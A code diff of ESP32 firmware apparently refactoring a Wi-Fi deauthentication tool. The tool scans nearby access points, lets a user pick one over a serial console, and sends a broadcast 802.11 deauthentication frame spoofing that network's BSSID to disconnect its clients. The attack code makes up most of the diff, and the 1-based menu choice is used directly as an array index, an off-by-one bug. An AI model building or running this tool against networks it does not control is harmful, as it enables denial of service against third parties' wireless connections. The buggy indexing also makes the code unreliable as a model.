@@ -1,33 +1,23 @@
-#include <stdio.h>
-#include <string.h>
-#include "nvs_flash.h"
-#include "esp_wifi.h"
-#include "esp_event.h"
-#include "esp_log.h"
-#include "esp_netif.h"
-#include "esp_console.h"
+#include "main.h"
 #include "esp_vfs_dev.h"
 #include "driver/uart.h"
+static const char *TAG = "wifi_deauth";
 
-static const char *TAG = "wifi_scan";
-
-// Updated deauth frame format
+// Deauthorization frame
 static const uint8_t deauth_frame_template[] = {
-    0xC0, 0x00,                         // Frame Control
-    0x00, 0x00,                         // Duration
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
-    0x00, 0x00,                         // Sequence Control
-    0x01, 0x00                          // Reason Code
+    0xC0, 0x00,                         
+    0x00, 0x00,                         
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+    0x00, 0x00,                         
+    0x01, 0x00                          
 };
 
-static void initialize_console(void) {
-    // Disable buffering on stdin and stdout
+void initialize_console(void) {
     setvbuf(stdin, NULL, _IONBF, 0);
     setvbuf(stdout, NULL, _IONBF, 0);
 
-    // Configure UART
     uart_config_t uart_config = {
         .baud_rate = 115200,
         .data_bits = UART_DATA_8_BITS,
@@ -37,10 +27,10 @@ static void initialize_console(void) {
     };
     ESP_ERROR_CHECK(uart_param_config(UART_NUM_0, &uart_config));
     ESP_ERROR_CHECK(uart_driver_install(UART_NUM_0, 256, 0, 0, NULL, 0));
-    esp_vfs_dev_uart_use_driver(UART_NUM_0);
+    esp_vfs_dev_uart_use_driver(UART_NUM_0); 
 }
 
-static esp_err_t wifi_init(void) {
+esp_err_t wifi_init(void) {
     esp_err_t ret = nvs_flash_init();
     if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
         ESP_ERROR_CHECK(nvs_flash_erase());
@@ -61,7 +51,7 @@ static esp_err_t wifi_init(void) {
     return ESP_OK;
 }
 
-static wifi_ap_record_t* scan_wifi_networks(uint16_t* ap_count) {
+wifi_ap_record_t* scan_wifi_networks(uint16_t* ap_count) {
     wifi_scan_config_t scan_config = {
         .ssid = NULL,
         .bssid = NULL,
@@ -82,14 +72,15 @@ static wifi_ap_record_t* scan_wifi_networks(uint16_t* ap_count) {
     return ap_records;
 }
 
-static void print_networks(wifi_ap_record_t* ap_records, uint16_t ap_count) {
+void print_networks(wifi_ap_record_t* ap_records, uint16_t ap_count) {
     printf("\nFound %d access points:\n", ap_count);
+    
     for (int i = 0; i < ap_count; i++) {
         printf("%d. SSID: %s, RSSI: %d\n", i + 1, ap_records[i].ssid, ap_records[i].rssi);
     }
 }
 
-static int get_user_selection(uint16_t max_networks) {
+int get_user_selection(uint16_t max_networks) {
     char input[8];
     int selection = -1;
     bool valid_input = false;
@@ -97,11 +88,9 @@ static int get_user_selection(uint16_t max_networks) {
     while (!valid_input) {
         printf("\nEnter network number (1-%d): ", max_networks);
         fflush(stdout);
-        
-        // Clear input buffer
+    
         memset(input, 0, sizeof(input));
         
-        // Read input from UART
         if (fgets(input, sizeof(input), stdin) != NULL) {
             selection = atoi(input);
             if (selection >= 1 && selection <= max_networks) {
@@ -114,7 +103,7 @@ static int get_user_selection(uint16_t max_networks) {
     return selection;
 }
 
-static esp_err_t send_deauth(const wifi_ap_record_t *ap_record) {
+esp_err_t send_deauth_frame(const wifi_ap_record_t *ap_record) { // Renamed function
     uint8_t deauth_frame[sizeof(deauth_frame_template)];
     memcpy(deauth_frame, deauth_frame_template, sizeof(deauth_frame_template));
     memcpy(&deauth_frame[10], ap_record->bssid, 6);
@@ -149,7 +138,7 @@ void wifi_deauth_control(void) {
     int selection = get_user_selection(ap_count);
     if (selection >= 0) {
         ESP_LOGI(TAG, "Selected network: %s", ap_records[selection].ssid);
-        ESP_ERROR_CHECK(send_deauth(&ap_records[selection]));
+        ESP_ERROR_CHECK(send_deauth_frame(&ap_records[selection])); // Renamed function
     } else {
         ESP_LOGE(TAG, "Invalid selection");
     }
